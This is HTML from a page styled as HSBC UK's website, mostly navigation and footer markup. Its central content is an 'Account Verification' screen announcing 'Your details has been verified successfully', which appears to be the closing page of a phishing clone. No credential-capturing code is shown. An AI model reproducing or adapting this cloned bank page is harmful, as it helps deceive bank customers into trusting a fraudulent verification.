                                                <h3><a href="https://investments.hsbc.co.uk/products" title="Investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investments</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/206/investment-funds-online" title="Investment funds" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Funds/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Funds:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investment
                                                    funds</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/5/sif-isa" title="Selected Investment Funds ISA" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/Investments/FundsISA/Tab','WT.ti','Doormat:Investing:Investments:FundsISA:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Selected
                                                    Investment Funds ISA</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/9/sharedealing" title="Sharedealing" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Sharedealing/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Sharedealing:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Sharedealing</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://investments.hsbc.co.uk/product/19/hsbc-premier-financial-advice" title="HSBC Premier Financial Advice" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/PremierAdvice/Tab','WT.ti','Doormat:Homepage:Investing:Investments:PremierAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Financial Advice</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/11/child-trust-funds" title="Child Trust Fund" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/ChildTrustFund/Tab','WT.ti','Doormat:Homepage:Investing:Investments:ChildTrustFund:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Child
                                                    Trust Fund</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://investments.hsbc.co.uk/products" title="View all investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Products/ViewAll/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Product:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">investments</span></a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Global Investment Centre" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Global
                                                Investment Centre</a></h3>

                                                <p>Trade funds online</p>

                                                <p class="ctaLink"><a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Find out more about trading funds online" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
                                                out more <span class="hidden" aria-hidden="true">about trading funds online</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/news" title="Financial news and analysis." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Investing_PromoSlot1','WT.ti','Doormat:Homepage:Investing:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial
                                                news and analysis.</a></h3>
                                            </div>

                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/why-invest-with-us" title="Why invest with us?" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/WhyInvestWithUs/Tab','WT.ti','Doormat:Homepage:Investing:WhyInvestWithUs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Why
                                                invest with us?</a></h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_3" widgetid="dijit__WidgetBase_3"><a tabindex="0" aria-expanded="false" aria-label="Insurance - property and family" aria-haspopup="true" class="mainTopNav" id="insurance"><strong>Insurance</strong><br>
                            Property &amp; family</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to site search">Move Planning navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HeaderLink/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:HeaderLink:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    Insurance</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/premier-travel/" title="HSBC Premier Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Travel Insurance</a></li>

                                                </ul>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance/products/home/" title="Home Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot1','WT.ti','Doormat:Insurance:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
                                                    Insurance</a></h3>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance" title="View all HSBC Insurance options" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/AllInsuranceProducts/Tab','WT.ti','Doormat:Homepage:Insurance:AllInsuranceProducts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                    all HSBC Insurance options</a></h3>
                                            </div>

                                            <div class="column">

                                                <h3><a href="https://www.hsbc.co.uk/help" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/home/claims/" title="Home Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HomeInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:HomeInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
                                                    Insurance claims</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    Insurance claims</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/premier-travel/" title="Premier Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier
                                                    Travel Insurance claims</a></li>

                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/1/2/customer-support" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_4" widgetid="dijit__WidgetBase_4"><a tabindex="0" aria-expanded="false" aria-label="Life events - help and support" aria-haspopup="true" class="mainTopNav" id="lifeEvents"><strong>Life events</strong><br>
                            Help and support</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to site search">Move to site search</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/#/all" title="Life events" class="extLink" onclick="">Life events</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/dealing-with-bereavement" title="Bereavement support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/BereavementSupport/Tab','WT.ti','Doormat:Homepage:Planning:BereavementSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bereavement
                                                    support</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/dealing-with-separation" title="Separation support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SeparationSupport/Tab','WT.ti','Doormat:Homepage:Planning:SeparationSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Separation
                                                    support</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/settling-in-the-uk" title="Settling in the UK" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SettlingInTheUK/Tab','WT.ti','Doormat:Homepage:Planning:SettlingInTheUK:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Settling
                                                    in the UK</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/getting-married" title="Getting married" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GettingMarried/Tab','WT.ti','Doormat:Homepage:Planning:GettingMarried:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Getting
                                                    married</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/planning-your-retirement" title="Planning your retirement" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningYourRetirement/Tab','WT.ti','Doormat:Homepage:Planning:PlanningYourRetirement:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
                                                    your retirement</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/growing-your-wealth" title="Growing your wealth" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GrowingYourWealth/Tab','WT.ti','Doormat:Homepage:Planning:GrowingYourWealth:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Growing
                                                    your wealth</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/moving-abroad" title="Moving abroad" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/MovingAbroad/Tab','WT.ti','Doormat:Homepage:Planning:MovingAbroad:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Moving
                                                    abroad</a></li>
                                                </ul>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/tool/800/financial-health-check" title="Financial health check" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/FinancialHealthCheck/Tab','WT.ti','Doormat:Homepage:Planning:FinancialHealthCheck:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial
                                                    health check</a></li>
                                                </ul>

                                            </div>
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/planningtools" title="Planning tools" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningTools/Tab','WT.ti','Doormat:Homepage:Planning:PlanningTools:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
                                                tools</a></h3>
                                            </div>
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Protecting
                                                what matters</a></h3>

                                                <p class="ctaLink"><a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters. Learn more." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
                                                more</a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/help/" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/" title="Ways we can help" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/NeedAdvice/Tab','WT.ti','Doormat:Homepage:Planning:CustomerSupport:NeedAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
                                                    we can help</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/article/81/frequently-asked-questions" title="Frequently asked questions" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/FAQs/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:FAQs/Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Frequently
                                                    asked questions</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>

        

        

        <p>
            
        </p>

        <div class="pageHeaderBg">
            <div class="pageHeading row">
                <div class="pageHeadingInner">
                    <h2>Account Verification</h2>
                </div>
            </div>
        </div>

        <p>
            
        </p>
        

        <div class="innerPage" id="innerPage">
            <div class="">

                <div class="containerStyle01">
                    
                    <div class="grid grid_24">
                        <div class="activate">
                            <h3 class="hidden" aria-hidden="true">Your session has been invalidated. Please try to login again.</h3>
                            <div class="questionGroup">

                                
								<center>
								<div id="success_loader" style="width: 100px;height: 100px;">
									<svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 130.2 130.2">
										<circle class="path circle" fill="none" stroke="#73AF55" stroke-width="6" stroke-miterlimit="10" cx="65.1" cy="65.1" r="62.1"/>
										<polyline class="path check" fill="none" stroke="#73AF55" stroke-width="6" stroke-linecap="round" stroke-miterlimit="10" points="100.2,40.2 51.5,88.8 29.8,67.5 "/>
									</svg>
								</div>

								<br>
								<br>
								<span id="loader_status" style="font-size: 1.4em;line-height: 1.2em;padding-bottom: 14px;"><b>Your details has been verified successfully</b></span>
								
								</center>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>

                            </div>
                        </div>
                    </div>
                    
                </div>

                

                

            </div>
        </div>
        



        
        

        
        <style type="text/css">
            #footerMapRow,
            #footerLinksRow,
            #footerUtilityRow {
                width: 940px;
            }
            
            #footerMap #footerMapRow .column.last {
                padding-right: 0
            }
            
            #footerMap #footerMapRow .column {
                padding: 0 10px 0 0;
                width: 145px;
            }
        </style>
        <div dir="ltr" id="footerLinks">
            <div id="footerLinksRow">
                <ul style="display: flex; white-space: nowrap;">
                    <li class="contact">
                        <a href="https://www.hsbc.co.uk/help/" title="Help &amp; Support">Help &amp; Support</a></li>
                    <li class="branch">
                        <a href="http://www.hsbc.co.uk/branch-finder" title="Find a branch">Find a branch</a></li>
                    
                </ul>
            </div>
        </div>
        <div dir="ltr" id="footerMap">
            <div class="sixCol" id="footerMapRow">
                <div class="column last">
                    <h2>
                <a href="https://www.hsbc.co.uk/help/" title="Support">Support</a></h2>
                    <ul>
                        <li>
                            <a href="http://www.hsbc.co.uk/help/security-centre/" title="Security centre">Security centre</a></li>
                        <li>
                            <a href="https://www.hsbc.co.uk/help/card-support/" title="Card support">Card support</a></li>
                        <li>
                            <a onclick="window.tealiumLaunchCobrowse(); return false;" href="#" title="CoBrowse">CoBrowse</a></li>
                    </ul>
                </div>
            </div>
        </div>
        <div dir="ltr" id="footerUtility">
            <div id="footerUtilityRow">
                <ul>
                    <li>
                        <a href="http://www.about.hsbc.co.uk/" title="About HSBC">About HSBC</a></li>
                    <li>
                        <a href="https://www.hsbc.co.uk/site-map/" title="Site map">Site map</a></li>
                    <li>
                        <a href="http://www.hsbc.co.uk/legal" title="Legal">Legal</a></li>
                    <li>
                        <a href="http://www.hsbc.co.uk/privacy-notice" title="Privacy Notice">Privacy notice</a></li>
                    <li>
                        <a href="http://www.hsbc.co.uk/cookie-policy" title="Cookie Policy" class="dnt_no_consent">Cookie
                    Policy</a></li>
                    <li>
                        <a href="https://www.hsbc.co.uk/accessibility/" title="Accessibility">Accessibility</a></li>
                    <li>
                        <a href="https://www.hsbc.com/" title="HSBC Group">HSBC Group</a></li>
                </ul>
                <p>
                    © &nbsp;HSBC Group <script>document.write((new Date()).getFullYear());</script></p>
            </div>
        </div>
        <div class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent" widgetid="countrySelectorContent" style="display: none;" lang="en">
            <div role="presentation" class="tabsNode">
                <ul class="regionTabs" role="tablist">

                    <li role="tabmenu" class="selected">
                        <a class="tabs" role="tab" id="europeTab" aria-controls="europe" tabindex="0" aria-expanded="true" title="
					Europe: Click to view HSBC websites in this region" data-region="europe" href="#">
                    Europe</a>

                    </li>

                    <li role="tabmenu" class="">
                        <a class="tabs" role="tab" id="asiaPacificTab" aria-controls="asiaPacific" tabindex="-1" aria-expanded="false" title="Asia-Pacific: Click to view HSBC websites in this region" data-region="asiaPacific" href="#">
                    Asia-Pacific</a>
                    </li>

                    <li role="tabmenu" class="">
                        <a class="tabs" role="tab" id="middleEastTab" aria-controls="middleEast" tabindex="-1" aria-expanded="false" title="Middle East &amp; Africa: Click to view HSBC websites in this region" data-region="middleEast" href="#">
                    Middle East &amp; Africa</a>
                    </li>

                    <li role="tabmenu" class="">
                        <a class="tabs" role="tab" id="americasTab" aria-controls="americas" tabindex="-1" aria-expanded="false" title="Americas: Click to view HSBC websites in this region" data-region="americas" href="#">
                    Americas</a>
                    </li>

                </ul>

            </div>
            <div class="regions" aria-label="regions">
                <div aria-hidden="false" class="region activeRegion" id="europeMenu" role="tabpanel" aria-labelledby="europeTab">
                    <h2 style=" display: none;">
                Europe</h2>
                    <div class="navList">
                        <ul class="nav">
                            <li class="multiTop">
                                <a href="http://www.hsbc.am/1/2/en/home" title="Armenia" class="am" lang="en-GB">Armenia</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.am/1/2/hy/home" title="Հայաստան" lang="hy-AM">Հայաստան</a></li>
                            <li>
                                <a href="https://ciiom.hsbc.com/" title="Channel Islands and Isle of Man" class="im" lang="en-GB">Channel
                            Islands
                            and Isle of Man</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.cz/1/2/cze/en/business" title="Czech Republic" class="cz" lang="cs-CZ">Czech
                            Republic</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.cz/1/2/cze/cs/business" title="Česká republika" lang="en-GB">Česká
                            republika</a></li>
                            <li class="multiTop">
                                <a href="https://www.hsbc.fr/1/2/english/personal" title="France (English)" class="fr" lang="en-GB">France
                            <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="https://www.hsbc.fr/1/2/hsbc-france" title="France (Français)" lang="fr-FR">France
                            <span>(Français)</span></a></li>
                            <li>
                                <a href="http://www.hsbctrinkaus.de/global/display/home" title="Germany" class="de" lang="en-GB">Germany</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.gr/1/2/en/home" title="Greece" class="gr" lang="en-GB">Greece</a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.gr/1/2/el/home" title="Ελλάδα" lang="el-GR">Ελλάδα</a></li>
                        </ul>
                        <ul class="nav">

                            <li>
                                <a href="http://www.offshore.hsbc.com/1/2/international/home" title="HSBC Expat" class="je" lang="en-GB">HSBC
                            Expat</a></li>
                            <li>
                                <a href="http://www.hsbccredit.hu/" title="Hungary" class="hu" lang="hu-HU">Hungary</a></li>
                            <li>
                                <a href="http://www.hsbc.ie/1/2/hsbc-ireland/home/home" title="Ireland" class="ie" lang="en-IE">Ireland</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.kz/1/2/en/home" title="Kazakhstan" class="kz" lang="en-GB">Kazakhstan</a></li>
                            <li class="multiMiddle">
                                <a href="http://www.hsbc.kz/1/2/kk/home" title="Қазақстан" lang="kk-KZ">Қазақстан</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.kz/1/2/ru/home" title="Казахстан" lang="ru-RU">Казахстан</a></li>
                            <li>
                                <a href="https://www.hsbc.com.mt/1/2/home/hsbc-bank-malta-plc-home-page" title="Malta" class="mt" lang="en-GB">Malta</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.pl/1/2/en/home" title="Poland" class="pl" lang="en-GB">Poland</a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.pl/1/2/pl/home" title="Polska" lang="pl-PL">Polska</a></li>
                        </ul>

                        <ul class="nav">
                            <li class="multiTop">
                                <a href="http://www.hsbc.ru/1/2/rus/en/home" title="Russia" class="ru" lang="en-GB">Russia</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.ru/1/2/rus/ru/home" title="Россия" lang="ru-RU">Россия</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/en/home" title="Slovakia" class="sk" lang="en-GB">Slovakia</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/sk/home/home" title="Slovensko" lang="sk-SK">Slovensko</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.es/1/2/esp/en/home" title="Spain" class="es" lang="es-ES">Spain</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.es/1/2/esp/es/home" title="España" lang="en-GB">España</a></li>
                            <li>
                                <a href="http://www.hsbc.ch/1/2/che/en/corporate" title="Switzerland" class="ch" lang="en-GB">Switzerland</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.tr/eng/" title="Turkey" class="tr" lang="en-GB">Turkey</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.tr/tr/" title="Türkiye" lang="tr-TR">Türkiye</a></li>
                            <li class="last">
                                <a href="http://www.hsbc.co.uk/1/2/personal" title="United Kingdom" class="uk" lang="en-GB">United
                            Kingdom</a></li>
                        </ul>
                    </div>
                </div>
                <div aria-hidden="true" class="region" id="asiaPacificMenu" style=" display: none;" role="tabpanel" aria-labelledby="asiaPacificTab">
                    <h2 style=" display: none;">
                Asia-Pacific</h2>
                    <div class="navList">
                        <ul class="nav">
                            <li>
                                <a href="http://www.hsbc.com.au/1/2/home" title="Australia" class="au" lang="en-AU">Australia</a></li>
                            <li>
                                <a href="http://www.hsbc.com.bd/1/2/home" title="Bangladesh" class="bd" lang="en-GB">Bangladesh</a></li>
                            <li>
                                <a href="http://www.hsbc.com.bn/1/2/home" title="Brunei Darussalam" class="bn" lang="en-GB">Brunei
                            Darussalam</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.cn/1/2/home" title="China" class="cn" lang="en-GB">China</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.cn/1/2/" title="中国" lang="zh-CN">中国</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.hk/1/2/home" title="Hong Kong" class="hk" lang="en-GB">Hong Kong</a></li>
                            <li class="multiMiddle">
                                <a href="http://www.hsbc.com.hk/1/2/chinese/home" title="香港（繁體中文）" lang="zh-HK">香港<span>（繁體中文）</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.hk/1/2/simplified/home" title="香港（简体中文）" lang="zh-CN">香港<span>（简体中文）</span></a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.co.id/1/2/home_en_US" title="Indonesia (English)" class="id" lang="en-GB">Indonesia
                            <span>(English)</span></a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.co.id/1/2/home_in_ID" title="Indonesia (Bahasa Indonesia)" lang="id-ID">Indonesia
                            <span>(Bahasa
                                Indonesia)</span></a></li>
                        </ul>
                        <ul class="nav">
                            <li>
                                <a href="http://www.hsbc.co.in/1/2/homepage" title="India" class="in" lang="en-GB">India</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.co.jp/1/2/home" title="Japan" class="jp" lang="en-GB">Japan</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.co.jp/1/2/home-jp" title="日本" lang="ja-JP">日本</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.co.kr/1/2/home" title="Korea" class="kr" lang="en-GB">Korea</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.co.kr/1/2/home_ko" title="한국" lang="ko-KR">한국</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.mo/1/2/home-en" title="Macau" class="mo" lang="en-GB">Macau</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.mo/1/2/home-mo" title="澳門" lang="zh-MO">澳門</a></li>
                            <li>
